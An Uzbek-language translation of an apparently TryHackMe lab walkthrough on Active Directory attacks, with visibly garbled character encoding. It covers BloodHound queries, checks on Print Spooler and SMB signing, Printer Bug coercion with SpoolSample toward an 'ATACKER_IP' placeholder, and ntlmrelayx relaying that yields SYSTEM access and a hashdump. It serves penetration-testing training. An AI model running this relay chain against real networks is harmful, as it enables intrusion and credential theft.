
# â­ **AD Authentication Relay va Majburlangan Autentifikatsiya (Coerced Authentication) â€” Oâ€˜zbekcha tarjima**

Bu vazifada biz **avtomatlashtirilgan relay hujumlari**ni koâ€˜rib chiqamiz. Tarmoq boâ€˜ylab autentifikatsiya soâ€˜rovlari doimiy ravishda uchib yuradi va *Breaching AD* boâ€˜limida aytilganidek, agar omadimiz boâ€˜lsa, biz ularni ushlab, oâ€˜sha autentifikatsiya orqali tizimga kira olamiz.

Ammo **kutishni yoqtirmasakchi?**
Agar autentifikatsiyani *oâ€˜zimiz majburlab yubora olsakchi?*

THMSERVER1 da allaqachon imtiyozli kirish mavjud, lekin boshqa holatlarda bizda *constrained delegation* eksploitidan foydalanish imkoniyati boâ€˜lmasligi mumkin. Shunday vaziyatlarda quyidagi hujum turi hostlarga imtiyozli kirish olishda juda yaxshi yordam beradi.

---

## ğŸ–¥ **Machine Accounts (Mashina hisoblari)**

Har bir Windows kompyuterida **machine account** (mashina hisobi) mavjud. Bu â€” oâ€˜sha hostga tegishli AD foydalanuvchi hisobi.

* Parollari odatda **120 ta UTF16 belgidan iborat**.
* Ular avtomatik ravishda **har 30 kunda almashtiriladi**.
* Amalda ularni buzib boâ€˜lmaydi.

AD ichidagi koâ€˜plab xizmatlar aynan shu machine account orqali ishlaydi:

* Domain controllerâ€™lar AD sinxronizatsiyasi uchun
* Certificate Services orqali sertifikat olishda
* Tarmoq xizmatlari oâ€˜zaro autentifikatsiya qilish uchun

### ğŸ§¨ Maxsus holat

Baâ€™zan AD ichida **bitta kompyuterga boshqa kompyuter ustidan admin huquqlari berilgan boâ€˜ladi.**

Bu odatiy holat: DCâ€™lar, SQL klasterlar va muayyan xizmatlar bunga muhtoj.

Ammo **biz uchun bu juda qiziqarli hujum vektori** â€” chunki machine account orqali *coerced authentication* bajarish mumkin boâ€˜ladi.

---

## ğŸ” **BloodHound orqali qaysi mashina qaysi mashinani boshqarishini aniqlash**

BloodHoundâ€™da *custom query* yarating va quyidagi Cypher soâ€˜rovini kiriting:

```
MATCH p=(c1:Computer)-[r1:MemberOf*1..]->(g:Group)-[r2:AdminTo]->(n:Computer) RETURN p
```

Bu soâ€˜rov:
â†’ Qaysi kompyuter hisobi qaysi kompyuterga **AdminTo** (administrator) huquqiga ega ekanligini koâ€˜rsatadi.

Natija odatda quyidagiga oâ€˜xshaydi:

* **THMSERVER2** â†’ **THMSERVER1** ustidan administrator huquqiga ega.

Bu biz uchun **huquqni relay qilish** imkonini beradi.

---

# ğŸ–¨ **Printer Bug (MS-RPRN) orqali majburlangan autentifikatsiya**

Microsoft buni hatto â€œxususiyatâ€ deb eâ€™lon qilgan.
MS-RPRN protokoli orqali tarmoqdagi har qanday foydalanuvchi *Print Spooler* xizmatiga soâ€˜rov yuborib, maqsad hostni **biz tanlagan IP manzilga autentifikatsiya qilishga majbur qilishi** mumkin.

Bunga oâ€˜xshash eksploitlar:

* Print Spooler bug
* PetitPotam
* PrintNightmare

Yamalanmagan versiyalarda baâ€™zida hatto autentifikatsiya ham talab qilinmasdi.

### ğŸŸ¢ Hujum oâ€˜tkazish uchun 4 shart:

| Shart                                           | Holat        |
| ----------------------------------------------- | ------------ |
| 1. Yaroqli AD hisob maâ€™lumoti                   | Mavjud       |
| 2. Tarmoq orqali SMBâ€™ga ulanish                 | Mavjud       |
| 3. Maqsadda Print Spooler ishlash kerak         | Tekshiriladi |
| 4. SMB Signing **majburiy emas** boâ€˜lishi kerak | Tekshiriladi |

---

# ğŸ–¨ Print Spooler xizmatini tekshirish

Biz THMSERVER2 ichiga kira olmaymiz, shuning uchun tarmoq orqali WMI ishlatamiz:

```powershell
GWMI Win32_Printer -Computer thmserver2.za.tryhackme.loc
```

Natija printerlar roâ€˜yxatini beradi â€” demak **Print Spooler ishlayapti**.

Agar xatolik bersa, quyidagini ham sinab koâ€˜rish mumkin:

```powershell
Get-PrinterPort -ComputerName thmserver2.za.tryhackme.loc
```

---

# ğŸ” SMB Signing tekshiruvi

Bizga *signing allowed* boâ€˜lishi kerak, *required* emas.

Nmap orqali tekshiramiz:

```bash
nmap --script=smb2-security-mode -p445 thmserver1.za.tryhackme.loc thmserver2.za.tryhackme.loc
```

Natija shunday boâ€˜lishi kerak:

```
Message signing enabled but not required
```

Bu â€” hujum uchun mukammal sharoit.

---

# ğŸš€ **Authentication Relay ekspluatatsiyasi**

âš ï¸ Bu jarayon ba'zan beqaror boâ€˜ladi â€” Spooler oâ€˜chib ketishi mumkin yoki callback kelmasligi ehtimoli bor.

Biz quyidagi ketma-ketlikni ishlatamiz:

---

## 1ï¸âƒ£ **AttackBoxâ€™da NTLM Relay dasturini ishga tushirish**

```bash
python3.9 /opt/impacket/examples/ntlmrelayx.py -smb2support -t smb://THMSERVER1_IP -debug
```

Hostname emas, **IP** ishlatiladi â€” Kerberosga oâ€˜tib ketmasligi uchun.

---

## 2ï¸âƒ£ **THMSERVER2 ni bizga autentifikatsiya qilishga majbur qilish**

THMWRK1 ichida:

```cmd
C:\Tools\>SpoolSample.exe THMSERVER2.za.tryhackme.loc "ATACKER_IP"
```

Agar muvaffaqiyatli boâ€˜lsa, AttackBoxâ€™da relay quyidagi koâ€˜rinishda chiqadi:

---

## 3ï¸âƒ£ **Relay muvaffaqiyatli bajariladi**

Misol natija:

```
Authenticating as ZA/THMSERVER2$ SUCCEED
User: NT AUTHORITY\SYSTEM
```

Bu â€” **THMSERVER1 ichida SYSTEM huquqini oldik** degani.

Agar siz `-c 'whoami /all'` parametrini bersangiz â€” foydalanuvchi maâ€™lumotlari chiqadi.

Agar parametr bermasangiz â€” **hashdump** olinadi.

Ushbu credentialâ€™lar yordamida THMSERVER1 ga shell olish mumkin boâ€˜ladi.

---

# ğŸ¯ Yakuniy maâ€™no

Bu butun jarayon bizga quyidagilarni beradi:

* ADâ€™dagi mashina hisoblarining zaif konfiguratsiyasi qanchalik xavfli ekanini koâ€˜rsatadi
* Printer Bug orqali autentifikatsiyani majburiy chaqirish
* NTLM Relay orqali imtiyozli tizimga SYSTEM darajasi bilan kirish

Bu AD ekspluatatsiyasining eng mashhur va eng kuchli texnikalaridan biri.

